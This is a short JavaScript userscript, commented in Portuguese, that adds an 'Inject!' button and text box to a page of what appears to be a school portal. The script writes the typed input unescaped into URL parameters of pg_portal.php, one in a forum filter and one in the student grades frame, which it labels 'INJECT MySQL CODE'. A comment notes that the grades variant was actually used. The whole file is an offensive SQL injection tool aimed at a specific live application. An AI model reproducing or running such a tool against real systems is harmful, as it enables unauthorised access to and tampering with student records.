let InjectionTextBox;
let InjectButton;
let Doc;
let injectionLink;

function Main() {
    Doc = document.getElementsByTagName("body")[0];
    makeLink();
    makeButton();
    makeTextBox();
}

Main();

function makeTextBox() {
    InjectionTextBox = document.createElement("input");
    InjectionTextBox.type = "text";
    InjectionTextBox.style.width = "300px";
    try {
        Doc.insertBefore(InjectionTextBox, InjectButton);
    } catch (e) {
        console.log(e);
    }
}

function makeButton() {
    InjectButton = document.createElement("button");
    InjectButton.innerHTML = "Inject!";
    InjectButton.onclick = InjectCode;
    Doc.insertBefore(InjectButton, injectionLink);
}

function makeLink() {
    injectionLink = document.createElement("a");
    injectionLink.href = "";
    injectionLink.innerHTML = "< INJECT >"
    Doc.insertBefore(injectionLink, Doc.firstChild);
}

function InjectCode() {
    let codeToInject = InjectionTextBox.value;
    let x = `pg_portal.php?frame=frame_avisos.php&forum=X&permissao_aluno=X&tipo_acesso=&curso=&serie=&turma=&disc=&ano=&sem=&for_read=X&view=X&for_id=8187X&for_resposta=0&order=filtrar&filter=${codeToInject}`
    injectionLink.href = x;
}

// Esse aqui foi usado somente na tela de notas
function __InjectCode() {
    let codeToInject = InjectionTextBox.value;
    console.log(codeToInject);
    injectionLink.href = `pg_portal.php?frame=frame_alu_notas.php&slc=X&frame_notas=frame_alu_notas_grade.php&etapa=${codeToInject}`;
    injectionLink.innerHTML = "< INJECT MySQL CODE >"
}

